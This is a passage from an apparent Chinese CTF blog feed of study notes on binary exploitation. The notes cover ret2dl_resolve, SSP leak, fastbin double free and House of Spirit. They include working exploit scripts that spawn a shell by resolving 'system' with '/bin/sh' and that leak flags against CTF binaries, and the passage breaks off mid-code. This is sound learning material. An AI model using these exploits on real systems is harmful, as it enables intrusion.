        &lt;h3 id=&quot;堆的结构&quot;&gt;&lt;a href=&quot;#堆的结构&quot; class=&quot;headerlink&quot; title=&quot;堆的结构&quot;&gt;&lt;/a&gt;堆的结构&lt;/h3&gt;&lt;p&gt;malloc chunk&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>复现题目中探究的一些杂记</title>
    <link href="http://yoursite.com/2019/10/29/%E2%80%9D%E5%A4%8D%E7%8E%B0%E9%A2%98%E7%9B%AE%E4%B8%AD%E6%8E%A2%E7%A9%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9D%82%E8%AE%B0%E2%80%9C/"/>
    <id>http://yoursite.com/2019/10/29/%E2%80%9D%E5%A4%8D%E7%8E%B0%E9%A2%98%E7%9B%AE%E4%B8%AD%E6%8E%A2%E7%A9%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9D%82%E8%AE%B0%E2%80%9C/</id>
    <published>2019-10-29T15:03:47.000Z</published>
    <updated>2019-12-04T10:26:41.035Z</updated>
    
    <content type="html"><![CDATA[<p>记录一点自己的疑难点，越学真的是越发感觉自己的菜。</p><h3 id="杂记1"><a href="#杂记1" class="headerlink" title="杂记1"></a>杂记1</h3><p>例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">init();</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr1 = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">target = ptr1;</span><br><span class="line">ptr1[<span class="number">0</span>+<span class="number">0x10</span>] = <span class="number">0x66</span>;</span><br></pre></td></tr></table></figure><p>此处的ptr1[0+0x10]是对下标索引的操作（就是指针）。[]里移动0x01在64位里就是8字节光标的移动</p><h3 id="杂记2"><a href="#杂记2" class="headerlink" title="杂记2"></a>杂记2</h3><p>静态编译中hook的找法</p><img src="/2019/10/29/”复现题目中探究的一些杂记“/QQ图片20191114200718.png"><img src="/2019/10/29/”复现题目中探究的一些杂记“/QQ图片20191114200746.png"><h3 id="杂记3"><a href="#杂记3" class="headerlink" title="杂记3"></a>杂记3</h3><p> mprotect(add,len,prot)rdi = add ； rsi = len ；rdx = prot； </p><p> prot=7 是可读可写可执行 </p><h3 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h3><p>在linux 16版本中，scanf输入的数据过大超过linux栈空间的最大值（8m），就会自动调用堆块来储存数据。</p><p>在64位系统下，small bin &lt;0x400</p><p>在32位系统下，small bin &lt;0x200</p><p>所以你输入0x400字节数据，就会触发malloc_consolidate，使得fasted bin里的堆块合并到unsorted bin里面。</p><h3 id="直接利用ROPgadget在libc里找gadget偏移"><a href="#直接利用ROPgadget在libc里找gadget偏移" class="headerlink" title="直接利用ROPgadget在libc里找gadget偏移"></a>直接利用ROPgadget在libc里找gadget偏移</h3><p>在获取到了libc基址后，就可以直接利用ROPgadget在libc里寻找偏移了。</p><p>指令如下：</p><p>先创建一个libc.gadget文件，储存libc里的gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc-2.23.so&gt;libc.gadget</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5C%E2%80%9D%E5%A4%8D%E7%8E%B0%E9%A2%98%E7%9B%AE%E4%B8%AD%E6%8E%A2%E7%A9%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9D%82%E8%AE%B0%E2%80%9C%5Cimage-20191202235533413.png" alt="image-20191202235533413"></p><p>再利用grpe寻找需要的gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;pop rdi ; ret&quot; libc.gadget</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5C%E2%80%9D%E5%A4%8D%E7%8E%B0%E9%A2%98%E7%9B%AE%E4%B8%AD%E6%8E%A2%E7%A9%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9D%82%E8%AE%B0%E2%80%9C%5Cimage-20191202235612002.png" alt="image-20191202235612002"></p><p>当然！你也可以用另一种方法。</p><p>知道libc_base后，要获取pop rdi;ret这种，直接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop_rdx_ret = libc + lib.search(asm(<span class="string">"pop rdx\nret"</span>)).next()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记录一点自己的疑难点，越学真的是越发感觉自己的菜。&lt;/p&gt;
&lt;h3 id=&quot;杂记1&quot;&gt;&lt;a href=&quot;#杂记1&quot; class=&quot;headerlink&quot; title=&quot;杂记1&quot;&gt;&lt;/a&gt;杂记1&lt;/h3&gt;&lt;p&gt;例如&lt;/p&gt;
&lt;figure class=&quot;highlight c
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>对于ret2dl_resolve的探究</title>
    <link href="http://yoursite.com/2019/10/28/%E5%AF%B9%E4%BA%8Eret2-resolve%E7%9A%84%E6%8E%A2%E7%A9%B6/"/>
    <id>http://yoursite.com/2019/10/28/%E5%AF%B9%E4%BA%8Eret2-resolve%E7%9A%84%E6%8E%A2%E7%A9%B6/</id>
    <published>2019-10-28T15:32:04.000Z</published>
    <updated>2019-10-29T09:20:26.592Z</updated>
    
    <content type="html"><![CDATA[<p>关于ret2dl_resolve的研究，其实我个人看的不是很懂，这里算是简单记录一下而已。</p><p>等什么时候真正看懂了，再补上吧。</p><p>网络上前辈的教程：</p><blockquote><p><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve" target="_blank" rel="noopener">http://angelboy.logdown.com/posts/283218-return-to-dl-resolve</a><br><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a><br><a href="https://github.com/inaz2/roputils/blob/master/roputils.py" target="_blank" rel="noopener">https://github.com/inaz2/roputils/blob/master/roputils.py</a></p></blockquote><p>具体的，前辈们已经介绍的很详细了，在这里，我只是赘述自己学到的，整理一下自己能简单理解的东西</p><h1 id="ret2dl-resolve的核心原理"><a href="#ret2dl-resolve的核心原理" class="headerlink" title="ret2dl_resolve的核心原理"></a>ret2dl_resolve的核心原理</h1><p> ret2dl-resolve的核心原理是攻击符号重定位流程，使其解析库中存在的任意函数地址，从而实现got表的劫持。 </p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="为什么要设置延迟绑定"><a href="#为什么要设置延迟绑定" class="headerlink" title="为什么要设置延迟绑定"></a>为什么要设置延迟绑定</h2><p>​        要想回答这个问题，首先我们得从动态链接说起。为了减少存储器浪费，现代操作系统支持动态链接特性。即不是在程序编译的时候就把外部的库函数编译进去，而是在运行时再把包含有对应函数的库加载到内存里。由于内存空间有限，选用函数库的组合无限，显然程序不可能在运行之前就知道自己用到的函数会在哪个地址上。</p><p>​        比如说对于libc.so来说，我们要求把它加载到地址0x1000处，A程序只引用了libc.so，从理论上来说这个要求不难办到。但是对于用了liba,so, libb.so, libc.so……liby.so, libz.so的B程序来说，0x1000这个地址可能就被liba.so等库占据了。因此，程序在运行时碰到了外部符号，就需要去找到它们真正的内存地址，这个过程被称为重定位。</p><p>​        为了安全，现代操作系统的设计要求代码所在的内存必须是不可修改的，那么诸如call read一类的指令即没办法在编译阶段直接指向read函数所在地址，又没办法在运行时修改成read函数所在地址，怎么保证CPU在运行到这行指令时能正确跳到read函数呢？这就需要got表（Global Offset Table，全局偏移表）和plt表（Procedure Linkage Table，过程链接表）进行辅助了。 </p><p>​         在延迟加载的情况下，每个外部函数的got表都会被初始化成plt表中对应项的地址。当call指令执行时，EIP直接跳转到plt表的一个jmp，这个jmp直接指向对应的got表地址，从这个地址取值。此时这个jmp会跳到保存好的，plt表中对应项的地址，在这里把每个函数重定位过程中唯一的不同点，即一个数字入栈（本例子中write是18h,read是0，对于单个程序来说，这个数字是不变的），然后push got[1]并跳转到got[2]保存的地址。在这个地址中对函数进行了重定位，并且修改got表为真正的函数地址。当第二次调用同一个函数的时候，call仍然使EIP跳转到plt表的同一个jmp，不同的是这回从got表取值取到的是真正的地址，从而避免重复进行重定位。 </p><p>进行跟进分析后，发现，主要影响重定位的，是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">           ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">           struct link_map *__unbounded l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure><p>中的reloc_arg， 我们主要控制reloc_arg进行攻击。</p><h1 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/3i read 0x80482f0 &lt;read@plt&gt;:        jmp    DWORD PTR ds:0x804970c</span><br><span class="line">   0x80482f6 &lt;read@plt+6&gt;:      push   0x0</span><br><span class="line">   0x80482fb &lt;read@plt+11&gt;:     jmp    0x80482e0</span><br><span class="line">gdb-peda$ x/wx 0x804970c</span><br><span class="line">0x804970c &lt;read@got.plt&gt;:       0x080482f6</span><br><span class="line">gdb-peda$ x/2i 0x80482e0</span><br><span class="line">   0x80482e0:   push   DWORD PTR ds:0x8049704</span><br><span class="line">   0x80482e6:   jmp    DWORD PTR ds:0x8049708</span><br></pre></td></tr></table></figure><p>在第一次调用时，<code>jmp read@got.plt</code>会跳回<code>read@plt</code>，这是我们已经知道的。接下来，会将参数push到栈上并跳至<code>.got.plt+0x8</code>，这相当于调用以下函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve(link_map, rel_offset);</span><br></pre></td></tr></table></figure><p>​        </p><p>​        这就是重定位符号表，因为第一次调用函数的时候，并不是直接跳转到libc空间中的函数，而是在这个函数被调用了，才去把这个函数在libc的地址放到GOT表中。接下来，会通过两次push，最后跳到libc的_dl_runtime_resolve去执行。_dl_runtime_resolve的目的，是根据push 的两个参数导出函数的地址，然后放到相应的GOT表，并且调用它。 </p><p>那么，我们的思路是在内存中伪造Elf32_Rel和Elf32_Sym两个结构体，并手动传递reloc_arg使其指向我们伪造的结构体，让Elf32_Sym.st_name的偏移值指向预先放在内存中的字符串system完成攻击。 </p><h1 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h1><p>​        方法变成了覆盖 (link_map + 0x1c8) 处为 NULL, 也就是<code>if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)</code>这一句.<br>​        但是link_map是在ld.so上的,因此我们需要leak,若程序没有输出函数,则无法使用这个方法. </p><h1 id="使用ROPutils简化攻击步骤"><a href="#使用ROPutils简化攻击步骤" class="headerlink" title="使用ROPutils简化攻击步骤"></a>使用ROPutils简化攻击步骤</h1><p>使用通常的构造payload过程繁琐，虽然格式化，但是还是不利于我们编写。故此，我们使用roputils.py这个模块进行ret2_dl_resolve攻击</p><p>以 XMAN 2016-level3/level4 为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#为了防止命名冲突，这个脚本全部只使用roputils中的代码。如果需要使用pwntools中的代码需要在import roputils前import pwn，以使得roputils中的ROP覆盖掉pwntools中的ROP</span></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">'./level4'</span>)                        <span class="comment">#ROP继承了ELF类，下面的section, got, plt都是调用父类的方法</span></span><br><span class="line">bss_addr = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">read_got = rop.got(<span class="string">'read'</span>)</span><br><span class="line">read_plt = rop.plt(<span class="string">'read'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">140</span></span><br><span class="line"></span><br><span class="line">io = Proc(host = <span class="string">'172.17.0.2'</span>, port = <span class="number">10001</span>)        <span class="comment">#roputils中这里需要显式指定参数名</span></span><br><span class="line"></span><br><span class="line">buf = rop.fill(offset)                        <span class="comment">#fill用于生成填充数据</span></span><br><span class="line">buf += rop.call(read_plt, <span class="number">0</span>, bss_addr, <span class="number">0x100</span>)        <span class="comment">#call可以通过某个函数的plt地址方便地进行调用</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_addr+<span class="number">0x20</span>, bss_addr)        <span class="comment">#dl_resolve_call有一个参数base和一个可选参数列表*args。base为伪造的link_map所在地址，*args为要传递给被劫持调用的函数的参数。这里我们将"/bin/sh\x00"放置在bss_addr处，link_map放置在bss_addr+0x20处</span></span><br><span class="line"></span><br><span class="line">io.write(buf)</span><br><span class="line"></span><br><span class="line">然后我们直接用dl_resolve_data生成伪造的link_map并发送</span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>)                </span><br><span class="line">buf += rop.fill(<span class="number">0x20</span>, buf)                <span class="comment">#如果fill的第二个参数被指定，相当于将第二个参数命名的字符串填充至指定长度</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_addr+<span class="number">0x20</span>, <span class="string">'system'</span>)        <span class="comment">#dl_resolve_data的参数也非常简单，第一个参数是伪造的link_map首地址，第二个参数是要伪造的函数名</span></span><br><span class="line">buf += rop.fill(<span class="number">0x100</span>, buf)</span><br><span class="line"></span><br><span class="line">io.write(buf)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;关于ret2dl_resolve的研究，其实我个人看的不是很懂，这里算是简单记录一下而已。&lt;/p&gt;
&lt;p&gt;等什么时候真正看懂了，再补上吧。&lt;/p&gt;
&lt;p&gt;网络上前辈的教程：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://rk700.github.i
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>对于canary的ssp leak打法的学习（好像又名Stack smash）</title>
    <link href="http://yoursite.com/2019/10/28/%E5%AF%B9%E4%BA%8Ecanary%E7%9A%84ssp-leak%E6%89%93%E6%B3%95%E7%9A%84%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%A5%BD%E5%83%8F%E5%8F%88%E5%90%8DStack-smash%EF%BC%89/"/>
    <id>http://yoursite.com/2019/10/28/%E5%AF%B9%E4%BA%8Ecanary%E7%9A%84ssp-leak%E6%89%93%E6%B3%95%E7%9A%84%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%A5%BD%E5%83%8F%E5%8F%88%E5%90%8DStack-smash%EF%BC%89/</id>
    <published>2019-10-28T15:24:28.000Z</published>
    <updated>2019-10-28T15:27:42.139Z</updated>
    
    <content type="html"><![CDATA[<p>这里恬不知耻的先粘贴一大段i春秋关于ssp leak打法的讲解。<del>其实就是菜，自己讲不出个所以然</del></p><p> 除了通过各种方法泄露canary之外，我们还有一个可选项——利用<code>__stack_chk_fail</code>函数泄露信息。这种方法作用不大，没办法让我们getshell。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做<code>SSP(Stack Smashing Protect) Leak</code>.<br>在开始之前，我们先来回顾一下canary起作用到程序退出的流程。首先，canary被检测到修改，函数不会经过正常的流程结束栈帧并继续执行接下来的代码，而是跳转到<code>call __stack_chk_fail</code>处，然后对于我们来说，执行完这个函数，程序退出，屏幕上留下一行<br><code>*** stack smashing detected ***:[XXX] terminated</code>。这里的[XXX]是程序的名字。很显然，这行字不可能凭空产生，肯定是<code>__stack_chk_fail</code>打印出来的。而且，程序的名字一定是个来自外部的变量（毕竟ELF格式里面可没有保存程序名）。既然是个来自外部的变量，就有修改的余地。我们看一下<code>__stack_chk_fail</code>的源码，会发现其实现如下： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>) </span><br><span class="line">&#123;  </span><br><span class="line">    __fortify_fail (<span class="string">"stack smashing detected"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg) </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="comment">/* The loop is added only to keep gcc happy. */</span> </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)   </span><br><span class="line">        __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,             </span><br><span class="line">                        msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 我们看到<code>__libc_message</code>一行输出了<code>*** %s ***: %s terminated\n</code>。这里的参数分别是msg和<code>__libc_argv[0]</code>。<code>char *argv[]</code>是main函数的参数，<code>argv[0]</code>存储的就是程序名，且这个argv[0]就存在于栈上。</p><p>这里贴一个vidar的 Veritas501 师傅的讲解</p><p>可见，__libc_message 的第二个<code>%s</code>输出的是argv[0]，argv[0]是指向第一个启动参数字符串的指针，而在栈中，大概是这样一个画风 </p><img src="/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/canary_a768142147ca3976598941b5c6c67161.png"><p>所以SSP leak的玩法就是通过修改栈上的argv[0]指针，从而让<code>__stack_chk_fail</code>被触发后输出我们想要知道的东西。 </p><p>所以……  这位vidar的pwn王意思就是，管他三七二十一，暴力覆盖就是了，别管多长，只要你要的数据的地址你能拿到，覆盖！</p><p>这里放一个例题，三叶草的纳新题，canary2</p><img src="/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/20191023235955.png"><p>一看，无法泄露，也不能爆破，那自然就想到ssp leak打法</p><p>flag的地址在buf里面，你又能通过printf  get  buf地址。 那剩下的就只有暴力覆盖了</p><p>这里贴上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./canary2'</span>)</span><br><span class="line"><span class="comment">#sh = remote('pwnto.fun',10007)</span></span><br><span class="line">sh.recvuntil(<span class="string">'key: '</span>)</span><br><span class="line">key = sh.recv(<span class="number">9</span>)</span><br><span class="line">log.success(<span class="string">"the key="</span>+ key)</span><br><span class="line">key = key[<span class="number">2</span>:]</span><br><span class="line">log.success(<span class="string">"the key="</span>+ key)</span><br><span class="line">key = int(key,<span class="number">16</span>)</span><br><span class="line">payload = p64(key)*<span class="number">200</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline()</span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure><p>​        对了，这里记录一点我个人的小问题，recv接收后的key是字符串类型，所以不进行p64(key)直接发过去的是ascll，不是我们想要的指针类型。</p><p>​        寻思着，那打包一下就可以了吧。发现p64(key)失败，探究了一下，发现是字符串型转字符串型失败。又想着key = int(key)，也不成功。那是因为，int()是有两个参数的，我以前一直以为直接int(x)就好了。2333333333</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这里恬不知耻的先粘贴一大段i春秋关于ssp leak打法的讲解。&lt;del&gt;其实就是菜，自己讲不出个所以然&lt;/del&gt;&lt;/p&gt;
&lt;p&gt; 除了通过各种方法泄露canary之外，我们还有一个可选项——利用&lt;code&gt;__stack_chk_fail&lt;/code&gt;函数泄露信息。这种
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>fastedbin attack 探究</title>
    <link href="http://yoursite.com/2019/10/28/%C2%96fastedbin-attack-%E6%8E%A2%E7%A9%B6/"/>
    <id>http://yoursite.com/2019/10/28/%C2%96fastedbin-attack-%E6%8E%A2%E7%A9%B6/</id>
    <published>2019-10-28T15:16:06.000Z</published>
    <updated>2020-04-29T10:00:30.879Z</updated>
    
    <content type="html"><![CDATA[<h3 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin double free"></a>fastbin double free</h3><p> Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次 。</p><p>类似于 <img src="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/figure/fastbin_free_chunk3.png" alt="img"> </p><p>此时，chunk1被再次释放，其fd指向chunk2。</p><p>我们进行第一次malloc，得到chunk1，然后在chunk1.fd的位置写入你想要的地址，然后进行第二次malloc，获得chunk2，再进行第三次malloc，再次得到chunk1，因为此时chunk1的fd已经被你修改为你想要的地址，所以你进行第四次malloc的时候，会依据你chunk1.fd的内容在那个地址进行堆块分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> pre_size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> fd;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> bk;</span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line">CHUNK bss_chunk;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    <span class="keyword">void</span> *chunk_a,*chunk_b;</span><br><span class="line"></span><br><span class="line">    bss_chunk.size=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//chunk1</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)chunk_a=&amp;bss_chunk;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//再一次malloc的chunk1</span></span><br><span class="line">    chunk_b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//此时根据你第一次malloc时写好的chunk1.fd进行分配堆块。</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p"</span>,chunk_b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h3><p> 该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。 </p><p>这里，主要有几个本憨憨学的时候难以理解的点，来讲解一下。</p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5C%C2%96fastedbin-attack-%E6%8E%A2%E7%A9%B6%5Cimage-20200415101909292.png" alt="image-20200415101909292"></p><p>我们想要控制data2中的数据，可data2中的数据我们根本无法进行操作，但是data1和data3的数据我们有权限和能力进行修改</p><p>并且！！！！！！！</p><p>我们有能力去改动堆块指针，使得堆块指针能指向我们要的伪造地址</p><p>这个时候就完美符合House of Spirit的攻击要求了。</p><p>利用思路是:</p><p>（1）先在data1中伪造堆块，使得伪造的chunk的size位能够完美包含data2，并且在data3中伪造好下一个堆块，以绕过检测。</p><p>（2）改动堆块指针，使其指向我们伪造的堆块(这里注意，指向的得是伪造chunk的mem(也就是data域) 而不是head域)。</p><p>（3）将指针指向的伪造chunk进行free，使其放入fast bin 单链表里。</p><p>（4）申请堆块，这样，就会申请到data1中，data2的数据就可控啦<del>~</del>。</p><p>这里需要注意的点是:</p><p>1.mmap标志位不能被置1，不然会调用munmap_chunk去释放chunk(我寻思，一般没人会触发这个检测机制报错的)</p><p>2.伪造chunk的size字段不能超过fastbin最大值(我寻思，这玩意儿一般也没人会傻到触发报错)</p><p>3.在利用思路(3)这里，因为是fastbin，所以还会对后一个堆块的size进行检测，也就是下面这个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">        || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">                          &gt;= av-&gt;system_mem, <span class="number">0</span>))                        </span><br><span class="line">    <span class="comment">/*最后是下一个堆块的大小，要大于2*SIZE_ZE小于system_mem*/</span></span><br></pre></td></tr></table></figure><p>对应到伪造堆块那张示意图来说，需要在data1中伪造好size字段绕过第一个和第二个检查，data3则是伪造的是下一个堆块的size来绕过最后一个检查。</p><p>可以进行如图所示的一种构造</p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5C%C2%96fastedbin-attack-%E6%8E%A2%E7%A9%B6%5Cimage-20200415105145170.png" alt="image-20200415105145170"></p><h3 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h3><h4 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy_pwn"></a>easy_pwn</h4><p>这题来源于roar ctf。</p><p>这题的漏洞点在于write的时候出现了off by one漏洞，漏洞规则在于 只要你edit的size比原size大10，就可造成off by one。利用就是off by one + chunk overlapping + fasted bin attack</p><p>那么结合exp开始深入分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 